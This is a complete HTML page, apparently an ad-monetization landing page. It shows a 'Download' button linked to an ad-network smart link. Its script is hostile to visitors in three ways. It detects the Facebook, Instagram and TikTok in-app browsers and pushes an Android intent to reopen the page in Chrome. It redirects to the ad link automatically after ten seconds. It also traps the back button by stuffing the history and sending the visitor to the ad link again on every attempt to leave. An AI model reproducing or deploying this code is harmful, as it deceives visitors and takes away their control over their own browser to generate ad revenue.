<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Smart Link Redirect</title>
<style>
body{margin:0;padding:0;text-align:center;background:#000;font-family:Arial;}
.content{display:inline-block;margin-top:40px;padding:20px;background:#fff;border-radius:15px;}
img{width:100%;max-width:250px;display:block;margin:20px auto;border-radius:10px;}
.btn{display:inline-block;margin:15px;padding:12px 30px;background:#ff3b3b;color:#fff;font-size:18px;border-radius:10px;text-decoration:none;font-weight:bold;}
.btn:hover{background:#cc0000;}
.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:none;align-items:center;justify-content:center;}
.popup-box{background:#fff;padding:25px;border-radius:12px;text-align:center;width:85%;max-width:320px;}
.chromeBtn{background:#28a745;color:#fff;padding:12px 25px;border-radius:8px;text-decoration:none;display:inline-block;margin-top:15px;font-weight:bold;}
</style>
</head>
<body>

<div class="content">
<img src="https://i.imgur.com/RIiQnS0.jpeg">
<img src="https://i.imgur.com/jbGNrs0.gif">
<a href="https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7" class="btn">Download</a>
</div>

<div class="popup" id="browserPopup">
<div class="popup-box">
<h3>Better Experience</h3>
<p>Please open this page in Chrome browser</p>
<a id="chromeOpen" class="chromeBtn">Open in Chrome</a>
</div>
</div>

<script>
const smartLink="https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7";

// In-app browser detect
function isInApp(){
  let ua=navigator.userAgent || navigator.vendor || window.opera;
  return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram") || ua.includes("TikTok");
}

// Show Chrome popup if in-app
if(isInApp()){
  document.getElementById("browserPopup").style.display="flex";
}

// Chrome intent open
document.getElementById("chromeOpen").onclick=function(){
  let url=window.location.href;
  window.location.href="intent://"+url.replace(/^https?:\/\//,'')+"#Intent;scheme=https;package=com.android.chrome;end";
};

// ===== Auto redirect only once per session =====
const redirected = sessionStorage.getItem('smartRedirectDone');
if(!redirected){
  sessionStorage.setItem('smartRedirectDone','true');
  setTimeout(function(){
    window.location.replace(smartLink);
  },10000); // 10 seconds
}

// ===== Unlimited back button redirect =====
function trapHistory(){
  history.replaceState(null,null,location.href);
  for(let i=0;i<25;i++){ history.pushState(null,null,location.href); }
}
trapHistory();

window.addEventListener("popstate", function(){
  history.pushState(null,null,location.href);
  window.location.replace(smartLink); // unlimited redirect
});

// Optional: prevent page restore bypass
window.addEventListener("pageshow", function(e){
  if(e.persisted){
    window.location.replace(smartLink);
  }
});
</script>

</body>
</html>
